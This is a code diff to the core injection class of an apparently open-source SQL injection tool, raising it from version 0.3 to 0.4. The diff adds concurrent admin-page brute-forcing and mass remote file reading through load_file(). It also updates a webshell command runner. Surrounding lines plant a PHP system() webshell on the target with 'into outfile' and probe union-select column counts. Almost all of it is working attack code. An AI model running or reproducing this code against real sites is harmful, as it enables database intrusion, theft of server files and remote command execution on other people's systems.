@@ -11,11 +11,14 @@ import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLDecoder;
+import java.net.URLEncoder;
+import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Comparator;
 import java.util.List;
 import java.util.UUID;
+import java.util.concurrent.Callable;
 import java.util.concurrent.CompletionService;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.ExecutorCompletionService;
@@ -34,7 +37,7 @@ import com.jsql.mvc.model.database.Column;
 import com.jsql.mvc.model.database.Database;
 import com.jsql.mvc.model.database.ElementDatabase;
 import com.jsql.mvc.model.database.Table;
-import com.jsql.mvc.view.component.TestConsole;
+import com.jsql.mvc.view.component.CustomJList.StringObject;
 import com.jsql.tool.StringTool;
 
 /**
@@ -42,7 +45,7 @@ import com.jsql.tool.StringTool;
  */
 public class InjectionModel extends ModelObservable { 
 
-    public final String jSQLVersion = "0.3";
+    public final String jSQLVersion = "0.4";
 
     public String insertionCharacter,       // i.e, -1 in "[...].php?id=-1 union select[...]"
               firstSuccessPageSource,       // HTML source of page successfully responding to multiple fileds selection (select 1,2,3,...) 
@@ -65,7 +68,10 @@ public class InjectionModel extends ModelObservable {
                         proxyAddress,
                            proxyPort,
                  
-                            pathFile;
+                            pathFile,
+                            
+                      tempIndexesURL;
+    public Integer numberOfIndexes = 0;
 
     public boolean isProxyfied = false,
                     
@@ -96,6 +102,11 @@ public class InjectionModel extends ModelObservable {
         this.proxyAddress = prefs.get(ID2, "127.0.0.1");    // Default TOR config
            this.proxyPort = prefs.get(ID3, "8118");
             this.pathFile = prefs.get(ID4, System.getProperty("user.dir"));
+            
+        if(isProxyfied){
+            System.setProperty("http.proxyHost", proxyAddress);
+            System.setProperty("http.proxyPort", proxyPort);
+        }
     }
     
     public int securitySteps = 0;           // Current evasion step, 0 is 'no evasion'
@@ -135,13 +146,16 @@ public class InjectionModel extends ModelObservable {
             // Test if proxy is available then apply settings 
             if(isProxyfied && !proxyAddress.equals("") && !proxyPort.equals("")){
                 try {
+                	sendMessage("Testing proxy...");
                     new Socket(proxyAddress, Integer.parseInt(proxyPort)).close();
                 } catch (Exception e) {
-                    throw new PreparationException("Proxy connection failed: " + proxyAddress+":"+proxyPort);
+                    throw new PreparationException("Proxy connection failed: " + proxyAddress+":"+proxyPort+
+                    		"\nVerify your proxy informations or disable proxy setting.");
                 }
+                sendMessage("Proxy is responding.");
                 
-                System.setProperty("http.proxyHost", proxyAddress);
-                System.setProperty("http.proxyPort", proxyPort);
+//                System.setProperty("http.proxyHost", proxyAddress);
+//                System.setProperty("http.proxyPort", proxyPort);
             }
     
             // Test the HTTP connection
@@ -198,7 +212,7 @@ public class InjectionModel extends ModelObservable {
                 }else if(this.isBlindInjectable/* && etape==2*/){
                     this.sendMessage("Using blind injection...");
                     this.useBlindInjection = true;
-                    new GUIThread("binary-message","Each request will ask \"Is the bit is true?\", and a true response must not contains the following false opcode: "+blindModel.constantFalseMark+"\n").run();
+                    new GUIThread("binary-message","A blind SQL request is true if the diff between a correct page (e.g existing id) and current page is not as the following: "+blindModel.constantFalseMark+"\n").run();
                 }else if(this.isTimeBasedInjectable/* && etape==2*/){
                     this.sendMessage("Using timebased injection...");
                     this.useTimeBasedInjection = true;
@@ -337,7 +351,7 @@ public class InjectionModel extends ModelObservable {
             
             int total=7;
             while(0<total){
-//                try { System.out.println("Stoppable_getInsertionCharacter"); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
+//                try { System.out.println("Stoppable_getInsertionCharacter"); } catch (InterruptedException e) { e.printStackTrace(); }
                 // The user need to stop the job
                 if(isPreparationStopped()) throw new StoppableException();
                 try {
@@ -383,18 +397,22 @@ public class InjectionModel extends ModelObservable {
             // Search if the source contains 1337[index]7331, this notation allows to exclude
             // pages that display our own url in the source
             for(selectIndex=1, selectFields="133717330%2b1"; selectIndex<=10 ;selectIndex++, selectFields += ",1337"+selectIndex+"7330%2b1")
-                taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+"));
+                taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+", selectIndex+""));
             
             int total=10;
             
             try {
                 // Starting up with 10 requests, loop until 100
                 while( !requestFound && total<99 ){
-//                    try { System.out.println("Stoppable_getInitialQuery " + selectIndex); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
+//                    try { System.out.println("Stoppable_getInitialQuery " + selectIndex); } catch (InterruptedException e) { e.printStackTrace(); }
                     // Breaks the loop if the user needs
                     if(isPreparationStopped()) throw new StoppableException();
     
                     MyCallable currentCallable = taskCompletionService.take().get();
+                    if(!Pattern.compile(".*The used SELECT statements have a different number of columns.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
+                        InjectionModel.this.numberOfIndexes = Integer.parseInt(currentCallable.tag);
+                        InjectionModel.this.tempIndexesURL = currentCallable.url.replaceAll("0%2b1","1");
+                    }
                     // Found a correct mark 1337[index]7331 in the source
                     if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
                         model.firstSuccessPageSource = currentCallable.content;
@@ -404,7 +422,7 @@ public class InjectionModel extends ModelObservable {
                     }else{
                         selectIndex++;
                         selectFields += ",1337"+selectIndex+"7330%2b1";
-                        taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+"));
+                        taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+", selectIndex+""));
                         total++;
                     }
                 }
@@ -653,15 +671,9 @@ public class InjectionModel extends ModelObservable {
     }
 
     public void executeShell(String path, String cmd, UUID l, String wbhPath) {
-        /*
-         * http://127.0.0.1/test_outfile.php?c=ipconfig+/all
-         */
-//        sendMessage(path+" "+cmd);
-//        sendMessage(this.initialUrl.substring(0, this.initialUrl.lastIndexOf("/"))+"/test_outfile.php?c="+cmd);
-        
         URLConnection con;
         try {
-            con = new URL(wbhPath+"test_outfile.php?c="+cmd.replace(" ", "+").trim()).openConnection();
+            con = new URL(wbhPath+"test_outfile.php?c="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")).openConnection();
             con.setReadTimeout(60000);
             con.setConnectTimeout(60000);
     
@@ -679,9 +691,93 @@ public class InjectionModel extends ModelObservable {
         } catch (IOException e) {
             e.printStackTrace();
         }
-
     }
 
+    /**
+     * Callable for parallelized HTTP tasks 
+     * url: SQL query
+     * content: source code of the web page
+     * tag: store user information (ex. current index)
+     */
+    public class MyURLCallable implements Callable<MyURLCallable>{
+        public String url, content;
+        MyURLCallable(String url){
+            this.url = url;
+        }
+        
+        @Override
+        public MyURLCallable call() throws Exception {
+            if(!endAdminSearch){
+                URL targetUrl = new URL( url );
+                HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();
+                conn.setRequestMethod("HEAD");
+                content = conn.getHeaderField(0);
+                
+                String logs = "\n"+url+"\n";
+                for (int i=0; ;i++) {
+                    String headerName = conn.getHeaderFieldKey(i);
+                    String headerValue = conn.getHeaderField(i);
+                    if (headerName == null && headerValue == null) break;
+                    
+                    logs += (headerName==null?"":headerName+": ")+headerValue+"\n";
+                }
+                
+                new GUIThread("add-header", logs).run();
+            }
+            return this;
+        }
+    }
+    
+    public boolean endAdminSearch = false;
+    public void getAdminPage(String string, List<StringObject> list) {
+        String fin = string.replaceAll("^https?://[^/]*", "");
+        String debut = string.replace(fin, "");
+        String chemin = fin.replaceAll("[^/]*$", "");
+        ArrayList<String> cheminArray = new ArrayList<String>();
+        if(chemin.split("/").length == 0)
+            cheminArray.add("/");
+        for(String s: chemin.split("/"))
+            cheminArray.add(s+"/");
+        
+        int nb = 0;
+        String progressURL = "";
+        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
+        CompletionService<MyURLCallable> taskCompletionService = new ExecutorCompletionService<MyURLCallable>(taskExecutor);
+        for(String segment: cheminArray){
+            progressURL += segment;
+        
+            for(StringObject s: list)
+                taskCompletionService.submit(new MyURLCallable(debut + progressURL + s.toString()));
+        }
+        
+        int submittedTasks = cheminArray.size() * list.size();
+        for(int tasksHandled=0; tasksHandled<submittedTasks && !endAdminSearch ;tasksHandled++){
+            try {
+                MyURLCallable currentCallable = taskCompletionService.take().get();
+                if(currentCallable.content != null && currentCallable.content.indexOf("200 OK") >= 0){
+                    new GUIThread("add-admin", currentCallable.url).run();
+                    nb++;
+                }
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            } catch (ExecutionException e) {
+                e.printStackTrace();
+            }
+        }
+        
+        taskExecutor.shutdown();
+        try {
+            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        endAdminSearch = false;
+        
+        sendMessage("Admin page(s) found: "+nb+"/"+submittedTasks);
+        new GUIThread("end-admin-search").run();
+    }
+    
     public void getShell(String s, String urlToWebshell) throws PreparationException, StoppableException {
         if(!hasFileRight){
             String[] sourcePage = {""};
@@ -718,6 +814,14 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
                 "+into+outfile+\""+s+"test_outfile.php\"--+"
                 );
         
+//        sendMessage(this.initialUrl+"");
+//        sendMessage(this.getData+"");
+//        sendMessage(this.tempIndexesURL+"");
+//        sendMessage(this.initialUrl+
+//                this.getData+
+//                this.tempIndexesURL.replace("133717331","(select+0x"+StringTool.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>")+")").replaceAll("--++","")+
+//                "+into+outfile+\""+s+"test_outfile.php\"--+");
+        
         String[] sourcePage = {""};
         String hexResult = new Stoppable_loopIntoResults(this).action(
             "concat(hex(load_file(0x"+StringTool.strhex(s+"test_outfile.php")+")),0x69)", 
@@ -732,21 +836,20 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
         }
         
         if(urlToWebshell.equals("")){
-            sendMessage("Using Webshell URL: "+ initialUrl.substring( 0, initialUrl.lastIndexOf('/')+1 )+"test_outfile.php");
             urlToWebshell = initialUrl.substring( 0, initialUrl.lastIndexOf('/')+1 );
         }
         
         ArrayList<String> f = new ArrayList<String>();
         f.add(s.substring( s.lastIndexOf('/'), s.length() ));
         if(StringTool.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1){
-            sendMessage("Webshell created in "+s);
             new GUIThread("add-shell", new String[]{s,urlToWebshell}).run();
         }
     }
     
     boolean hasFileRight = false;
     
-    public void getFile(String s) throws PreparationException, StoppableException{
+    public boolean endFileSearch = false;
+    public void getFile(List<StringObject> list) throws PreparationException, StoppableException{
         if(!hasFileRight){
             String[] sourcePage = {""};
             
@@ -772,25 +875,119 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
             }
         }
         
-        String[] sourcePage = {""};
+//        for(final StringObject path: list){
+//            sendMessage(path.toString());
+//        }
         
-        String hexResult = new Stoppable_loopIntoResults(this).action(
-            "concat(hex(load_file(0x"+StringTool.strhex(s)+")),0x69)", 
-            sourcePage, 
-            false, 
-            1, 
-            null);
+        int nb = 0;
+//        String progressURL = "";
+        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
+        CompletionService<MyLoopCallable> taskCompletionService = new ExecutorCompletionService<MyLoopCallable>(taskExecutor);
+//        for(String segment: cheminArray){
+//            progressURL += segment;
         
-        if(hexResult.equals("")){
-            this.sendResponseFromSite( "Can't read file"+s, sourcePage[0].trim() );
-            return;
+            for(StringObject s: list)
+                taskCompletionService.submit(new MyLoopCallable(s.toString()));
+//        }
+        
+        ArrayList<String> duplicate = new ArrayList<String>();
+        int submittedTasks = list.size();
+        for(int tasksHandled=0; tasksHandled<submittedTasks && !endFileSearch ;tasksHandled++){
+            try {
+                MyLoopCallable currentCallable = taskCompletionService.take().get();
+                if(currentCallable.content.equals("")){
+//                    sendErrorMessage( "Can't read file"+currentCallable.url );
+                }else{
+                  ArrayList<String> f = new ArrayList<String>();
+                  f.add(currentCallable.url.substring( currentCallable.url.lastIndexOf('/')+1, currentCallable.url.length() ));
+                  f.add(StringTool.hexstr(currentCallable.content).replace("\r", ""));
+                  f.add(currentCallable.url);
+                  new GUIThread("add-file", f).run();
+                  if(!duplicate.contains(f.get(2).replace(f.get(0), "")))
+                      sendMessage("Shell might be possible in folder "+f.get(2).replace(f.get(0), ""));
+                  nb++;
+                  duplicate.add(f.get(2).replace(f.get(0), ""));
+                }
+//                if(currentCallable.content != null && currentCallable.content.indexOf("200 OK") >= 0){
+//                    new GUIThread("add-admin", currentCallable.url).run();
+//                    nb++;
+//                }
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            } catch (ExecutionException e) {
+                e.printStackTrace();
+            }
         }
         
-        ArrayList<String> f = new ArrayList<String>();
-        f.add(s.substring( s.lastIndexOf('/')+1, s.length() ));
-        f.add(StringTool.hexstr(hexResult).replace("\r", ""));
-        f.add(s);
-        new GUIThread("add-file", f).run();
+        taskExecutor.shutdown();
+        try {
+            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        
+        endFileSearch = false;
+        
+        sendMessage("File(s) found: "+nb+"/"+submittedTasks);
+        new GUIThread("end-file-search").run();
+
+        
+//        String[] sourcePage = {""};
+//        
+//        String hexResult = new Stoppable_loopIntoResults(this).action(
+//            "concat(hex(load_file(0x"+StringTool.strhex(list)+")),0x69)", 
+//            sourcePage, 
+//            false, 
+//            1, 
+//            null);
+//        
+//        if(hexResult.equals("")){
+//            this.sendResponseFromSite( "Can't read file"+list+"test_outfile.php", sourcePage[0].trim() );
+//            return;
+//        }
+//        
+//        ArrayList<String> f = new ArrayList<String>();
+//        f.add(list.substring( list.lastIndexOf('/')+1, list.length() ));
+//        f.add(StringTool.hexstr(hexResult).replace("\r", ""));
+//        f.add(list);
+//        new GUIThread("add-file", f).run();
+//        sendMessage("Shell might be possible in folder "+f.get(2).replace(f.get(0), ""));
+    }
+    
+    public class MyLoopCallable implements Callable<MyLoopCallable>{
+        public String url, content, tag;
+        MyLoopCallable(String url){
+            this.url = url;
+        }
+        
+        MyLoopCallable(String url, String tag){
+            this(url);
+            this.tag = tag;
+        }
+        
+        @Override
+        public MyLoopCallable call() throws Exception {
+            if(!endFileSearch){
+            String[] sourcePage = {""};
+          
+            String hexResult = "";
+            try{
+           hexResult = new Stoppable_loopIntoResults(InjectionModel.this).action(
+              "concat(hex(load_file(0x"+StringTool.strhex(url)+")),0x69)", 
+              sourcePage, 
+              false, 
+              1, 
+              null);
+            }catch(PreparationException e){}
+            catch(StoppableException e){}
+          content = hexResult;
+//          if(hexResult.equals("")){
+//              sendResponseFromSite( "Can't read file"+url+"test_outfile.php", sourcePage[0].trim() );
+////              return;
+//          }
+            }
+            return this;
+        }
     }
 
     /**
@@ -1086,7 +1283,7 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
             String finalResultSource = "", currentResultSource = "";
             for(int limitSQLResult=0, startPosition=1/*, i=1*/;;startPosition = currentResultSource.length()+1/*, i++*/){
                 
-                try { /*System.out.println("loop: "+currentResultSource);*/ Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); }
+//                try { /*System.out.println("loop: "+currentResultSource);*/ } catch (InterruptedException e) { e.printStackTrace(); }
 //                if(isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())) throw new StoppableException();
                 if(isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())) break;
                 
@@ -1321,7 +1518,7 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
         try {
             urlObject = new URL(urlUltimate);
         } catch (MalformedURLException e) {
-            this.sendErrorMessage(e.getMessage());
+            this.sendErrorMessage("Malformed URL " + e.getMessage());
         }
         
         /**
@@ -1366,7 +1563,7 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
 //                System.out.println(new Date() + " " + urlUltimate);
                 urlObject = new URL(urlUltimate);
             } catch (MalformedURLException e) {
-                this.sendErrorMessage(e.getMessage());
+                this.sendErrorMessage("Malformed URL " + e.getMessage());
             }
         }
         
@@ -1376,7 +1573,7 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
             connection.setReadTimeout(15000);
             connection.setConnectTimeout(15000);
         } catch (IOException e) {
-            this.sendErrorMessage(e.getMessage());
+            this.sendErrorMessage("Error during connection: " + e.getMessage());
         }
         
         // Start the log informations
@@ -1400,7 +1597,7 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
                 try {
                     connection.addRequestProperty(s.split(":",2)[0], URLDecoder.decode(s.split(":",2)[1],"UTF-8"));
                 } catch (UnsupportedEncodingException e) {
-                    this.sendErrorMessage(e.getMessage());
+                    this.sendErrorMessage("Unsupported header encoding " + e.getMessage());
                 }
             }
             logs += "Header: " + this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection) + "\n";
@@ -1423,7 +1620,7 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
                 
                 logs += "Post: " + this.buildQuery("POST", postData, useVisibleIndex, dataInjection) + "\n";
             } catch (IOException e) {
-                this.sendErrorMessage(e.getMessage());
+                this.sendErrorMessage("Error during POST connection " + e.getMessage());
             }
         }
         
@@ -1449,9 +1646,9 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
             while( (line = reader.readLine()) != null ) pageSource += line;
             reader.close();
         } catch (MalformedURLException e) {
-            this.sendErrorMessage(e.getMessage());
+            this.sendErrorMessage("Malformed URL " + e.getMessage());
         } catch (IOException e) {
-            this.sendErrorMessage(e.getMessage()); /* lot of timeout in local use */
+            this.sendErrorMessage("Read error " + e.getMessage()); /* lot of timeout in local use */
         }
         
         // return the source code of the page
@@ -1461,7 +1658,7 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
     /**
      * Build a correct data for GET, POST, COOKIE, HEADER
      * Each can be:
-     *  - row data (no injection)
+     *  - raw data (no injection)
      *  - SQL query without index requirement
      *  - SQL query with index requirement
      * @param dataType Current method to build 
